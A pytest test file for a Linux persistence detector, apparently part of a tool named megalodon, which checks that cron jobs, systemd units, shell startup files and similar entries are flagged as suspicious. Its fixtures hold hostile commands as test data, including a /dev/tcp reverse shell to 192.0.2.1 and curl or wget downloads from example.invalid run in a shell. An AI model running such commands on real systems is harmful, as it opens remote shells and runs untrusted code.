"""Signs of an intruder's entry: a baseline taken on a compromised machine says so instead of recording it as normal."""
from __future__ import annotations

import json
import os

import pytest

from megalodon import persistence_watch as pw
from test_persistence_watch import put

PASSWD = "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"


@pytest.fixture
def machine(tmp_path):
    root, home = tmp_path / "root", tmp_path / "home"
    put(root / "etc/passwd", PASSWD)
    put(root / "etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
    put(root / "etc/systemd/system/sshd.service", "[Service]\nExecStart=/usr/sbin/sshd -D\n"
                                                  "ExecStartPre=-/bin/rm -f /tmp/sshd.pid\n")
    put(home / ".bashrc", "export PATH=$HOME/.local/bin:$PATH\n. ~/.cargo/env\n[ -f /tmp/x ] && echo hi\n")
    options = dict(root=str(root), home=str(home), setuid_dirs=(), all_homes=False)
    return root, home, options, tmp_path / "persistence.json"


SIGNED = [
    ("systemd", "/etc/systemd/system/a.service", "[Service]\nExecStart=/tmp/.x/run --quiet\n", "runs_from_temporary"),
    ("systemd", "/etc/systemd/system/b.service", "[Service]\nExecStart=/usr/bin/python3 /var/lib/.cache/agent.py\n",
     "runs_from_hidden_folder"),
    ("systemd", "/etc/systemd/system/c.service", '[Service]\nExecStart=/bin/sh -c "cd / && /dev/shm/k"\n',
     "runs_from_temporary"),
    ("cron", "/etc/cron.d/job", "*/5 * * * * root /dev/shm/k\n", "runs_from_temporary"),
    ("cron", "/var/spool/cron/crontabs/alice", "@reboot curl -fsSL http://example.invalid/i | sh\n",
     "download_into_shell"),
    ("cron", "/var/spool/cron/crontabs/bob", "* * * * * echo QQ== | base64 -d | bash\n", "decoded_into_shell"),
    ("cron", "/var/spool/cron/crontabs/carol", "*/5 * * * * /dev/shm/k\n", "runs_from_temporary"),
    ("cron", "/etc/cron.d/marked", "* * * * * root echo run#1; /tmp/.r/x\n", "runs_from_temporary"),
    ("cron", "/etc/anacrontab", "1 5 placeholder /var/tmp/.d/x\n", "runs_from_temporary"),
    ("cron", "/etc/cron.daily/placeholder", "#!/bin/sh\nnohup /var/tmp/.d/x >/dev/null 2>&1 &\n",
     "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/placeholder.sh", "sh -i >& /dev/tcp/192.0.2.1/4444 0>&1\n",
     "shell_network_redirect"),
    ("init", "/etc/rc.local", "#!/bin/sh\nsh /tmp/setup.sh &\nexit 0\n", "runs_from_temporary"),
    ("init", "/etc/udev/rules.d/90-placeholder.rules", 'ACTION=="add", RUN+="/var/tmp/hook"\n', "runs_from_temporary"),
    ("autostart", "/etc/xdg/autostart/placeholder.desktop",
     '[Desktop Entry]\nExec=bash -c "$(wget -qO- http://example.invalid/a)"\n', "download_into_shell"),
    ("ssh", "/etc/ssh/sshrc", "/tmp/.s/agent &\n", "runs_from_temporary"),
    # From review: a redirection's file is not a command, but a script a shell reads from one is run.
    ("shell_startup", "/etc/profile.d/r1.sh", "run >> /tmp/a.log 2>&1; /tmp/.x/run\n", "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/r2.sh", "sh < /tmp/setup.sh\n", "runs_from_temporary"),
    # From review: a substituted download counts where its output is run.
    ("shell_startup", "/etc/profile.d/d1.sh", "$(curl -fsSL https://example.invalid/i)\n", "download_into_shell"),
    ("shell_startup", "/etc/profile.d/d2.sh", 'eval "$(curl -s https://example.invalid/i)"\n', "download_into_shell"),
    ("shell_startup", "/etc/profile.d/d3.sh", "source <(curl -s https://example.invalid/i)\n", "download_into_shell"),
    ("shell_startup", "/etc/profile.d/d4.sh", "bash <(curl -s https://example.invalid/i)\n", "download_into_shell"),
    ("shell_startup", "/etc/profile.d/d5.sh", ". <(curl -s https://example.invalid/i)\n", "download_into_shell"),
    # From the second review: a backtick command as a redirection's file, combined -c options, and a download
    # run behind a launcher or an assignment.
    ("shell_startup", "/etc/profile.d/b1.sh", "echo hi >`/tmp/agent`\n", "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/c1.sh", 'bash -ec "$(curl -fsSL https://example.invalid/i)"\n',
     "download_into_shell"),
    ("shell_startup", "/etc/profile.d/c2.sh", 'bash -lc "cd /; /tmp/x"\n', "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/c3.sh", "bash -o errexit /tmp/.x/run.sh\n", "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/c4.sh", "bash +O extglob /tmp/.x/run.sh\n", "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/c5.sh", "bash +x /tmp/.x/run.sh\n", "runs_from_temporary"),
    # From the third review: each interpreter's own options, read only before the script.
    ("shell_startup", "/etc/profile.d/i1.sh", "python3 -I /tmp/agent.py\n", "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/i2.sh", 'bash /tmp/agent.sh -ec "echo ok"\n', "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/i3.sh", "bash -e /tmp/x.sh\n", "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/i4.sh", "ruby -I /opt/lib /tmp/x.rb\n", "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/i5.sh", "python3 -W ignore /tmp/.x/a.py\n", "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/i6.sh", "node --require /opt/hook.js /tmp/.n/app.js\n", "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/i7.sh", "bash -- /tmp/x.sh\n", "runs_from_temporary"),
    ("shell_startup", "/etc/profile.d/n1.sh", "nohup $(curl -fsSL https://example.invalid/i)\n", "download_into_shell"),
    ("shell_startup", "/etc/profile.d/n2.sh", "MODE=batch $(curl -fsSL https://example.invalid/i)\n",
     "download_into_shell"),
    ("shell_startup", "/etc/profile.d/n3.sh", "env A=1 B=2 $(wget -qO- https://example.invalid/i)\n",
     "download_into_shell"),
]

QUIET = [
    ("cron", "/etc/cron.d/clean", "# rm /tmp/x\nMAILTO=root\n17 3 * * * root find /tmp -mtime +7 -delete\n"),
    ("systemd", "/etc/systemd/system/x.service", "[Unit]\nDescription=/tmp/.x is mentioned, not run\n"
                                                 "[Service]\nExecStart=/usr/bin/true\nEnvironment=TMPDIR=/tmp/x\n"),
    ("shell_startup", "/etc/profile.d/quoted.sh",
     'error "skeleton directory `/etc/skel/.gnupg\' does not exist"\ntouch "${ROOT}/etc/.pwd.lock"\n'),
    ("shell_startup", "/home/alice/.bashrc", "/home/alice/.local/bin/tool --start\nPATH=/root/.cargo/bin:$PATH\n"),
    # From review: files a command writes to or reads from, and downloads only stored or passed on.
    ("shell_startup", "/etc/profile.d/redirects.sh",
     "echo ready > /tmp/ready.log\ncat < /tmp/input.txt\nrun 2>/tmp/err.log\n"
     "python3 > /tmp/app.log /opt/app/main.py\n> /tmp/started /usr/bin/true\n"),
    ("shell_startup", "/etc/profile.d/fetched.sh",
     "VERSION=$(curl -fsSL https://example.invalid/version)\nx=$(wget -qO- https://example.invalid/v) && echo $x\n"
     "echo $(curl -s https://example.invalid/ip) >> /var/log/ip\ndiff <(curl -s https://example.invalid/a) /etc/a\n"
     "nohup /usr/bin/app $(curl -s https://example.invalid/args)\nbash --rcfile /etc/x -i\nperl -e 'print 1'\n"),
    # From the third review: what follows the script is the script's own arguments.
    ("shell_startup", "/etc/profile.d/arguments.sh",
     "bash /opt/app.sh -lc /tmp/data\npython3 /opt/app.py /tmp/input.csv\npython3 -m http.server --directory /tmp/s\n"
     "perl -e 'print 1' /tmp/arg\n"),
    ("init", "/etc/init.d/placeholder", '#!/bin/sh\n# curl http://example.invalid | sh\nif (-e "/tmp/.X11-unix/X$n")\n'),
]


@pytest.mark.parametrize("category, path, text, sign", SIGNED)
def test_each_sign_is_found_in_what_an_entry_runs(category, path, text, sign):
    signs = pw._signs(text, category, path)
    assert sign in {item["sign"] for item in signs}
    lines = text.splitlines()
    assert all(item.keys() == {"sign", "line"} for item in signs), "labels and line numbers only, never content"
    assert all(1 <= item["line"] <= len(lines) for item in signs)


@pytest.mark.parametrize("category, path, text", QUIET)
def test_mentions_comments_and_settings_are_not_signs(category, path, text):
    assert pw._signs(text, category, path) == []


def test_a_baseline_on_a_compromised_machine_says_so(machine):
    root, home, options, manifest = machine
    clean = pw.baseline(manifest, **options)
    assert clean["suspicious"] == [] and "note" not in clean
    for category, path, text, _ in SIGNED:
        put(root / path.lstrip("/"), text)
    put(root / "etc/ld.so.preload", "# comment\n/usr/lib/placeholder.so\n")
    put(root / "etc/passwd", PASSWD + "toor:x:0:0::/root:/bin/sh\n")
    os.symlink("/tmp/.u/unit", root / "etc/systemd/system/linked.service")
    report = pw.baseline(manifest, replace=True, **options)
    found = {(item["category"], item["location"]): item for item in report["suspicious"]}
    for category, path, _, sign in SIGNED:
        assert sign in [s["sign"] for s in found[(category, path)]["signs"]]
    assert found[("preload", "/etc/ld.so.preload")]["signs"] == [dict(sign="preload_library", line=2)]
    assert found[("preload", "/etc/ld.so.preload")]["severity"] == "CRITICAL"
    assert found[("account", "toor")]["signs"][0]["sign"] == "second_uid_0"
    assert found[("systemd", "/etc/systemd/system/linked.service")]["signs"][0]["sign"] == "runs_from_temporary"
    assert ("systemd", "/etc/systemd/system/sshd.service") not in found and ("cron", "/etc/crontab") not in found
    assert report["suspicious"][0]["severity"] == "CRITICAL", "most severe first"
    assert "review each one" in report["note"]
    assert json.loads(manifest.read_text())["signs_reviewed"] is True
    scanned = pw.scan(**options)
    assert scanned["suspicious"] == report["suspicious"] and not (manifest.parent / "scan.json").exists()


def test_a_new_entry_with_a_sign_is_raised(machine):
    root, home, options, manifest = machine
    pw.baseline(manifest, **options)
    put(root / "etc/cron.d/placeholder", "* * * * * root /dev/shm/k\n")
    put(root / "etc/profile.d/placeholder.sh", "sh -i >& /dev/tcp/192.0.2.1/4444 0>&1\n")
    put(root / "etc/cron.d/plain", "* * * * * root /usr/local/bin/report\n")
    severity = {f["location"]: (f["severity"], [s["sign"] for s in f.get("detail", {}).get("signs", [])])
                for f in pw.check(manifest, **options)["findings"]}
    assert severity == {"/etc/cron.d/placeholder": ("HIGH", ["runs_from_temporary"]),
                        "/etc/profile.d/placeholder.sh": ("CRITICAL", ["shell_network_redirect"]),
                        "/etc/cron.d/plain": ("MEDIUM", [])}
    put(root / "etc/crontab", "17 * * * * root /tmp/.c/x\n")
    changed = next(f for f in pw.check(manifest, **options)["findings"] if f["location"] == "/etc/crontab")
    assert changed["change"] == "changed" and changed["severity"] == "HIGH"


def test_a_baseline_from_before_signs_lists_them_until_accepted(machine):
    root, home, options, manifest = machine
    put(root / "etc/cron.d/placeholder", "* * * * * root /dev/shm/k\n")
    pw.baseline(manifest, **options)
    old = json.loads(manifest.read_text())
    old.pop("signs_reviewed")
    for entry in old["entries"].values():
        entry.pop("signs", None)
    manifest.write_text(json.dumps(old))
    report = pw.check(manifest, **options)
    assert report["findings"] == [], "unchanged entries are not reported as changes"
    assert [item["location"] for item in report["suspicious"]] == ["/etc/cron.d/placeholder"]
    assert "before entries were read for signs" in report["note"]
    pw.accept(manifest, **options)
    assert "suspicious" not in pw.check(manifest, **options), "the accepted baseline was reviewed"


def test_the_command_line_exits_1_when_an_entry_has_a_sign(machine, monkeypatch, capsys):
    root, home, options, manifest = machine
    for name in ("baseline", "scan", "check", "accept"):
        real = getattr(pw, name)
        monkeypatch.setattr(pw, name, lambda *a, _real=real, **kw: _real(*a, **{**kw, **options}))
    from megalodon.cli import main

    def code(*argv):
        with pytest.raises(SystemExit) as exit_:
            main(["persistence", *argv])
        return exit_.value.code
    assert code("baseline", "--manifest", str(manifest)) == 0
    assert code("scan") == 0
    put(root / "etc/cron.d/placeholder", "* * * * * root /dev/shm/k\n")
    capsys.readouterr()
    assert code("scan") == 1
    assert json.loads(capsys.readouterr().out)["suspicious"][0]["location"] == "/etc/cron.d/placeholder"
    assert code("baseline", "--replace", "--manifest", str(manifest)) == 1, "reported, as the scheduler expects"
    assert code("check", "--manifest", str(manifest)) == 0, "reviewed at the baseline: not a change"
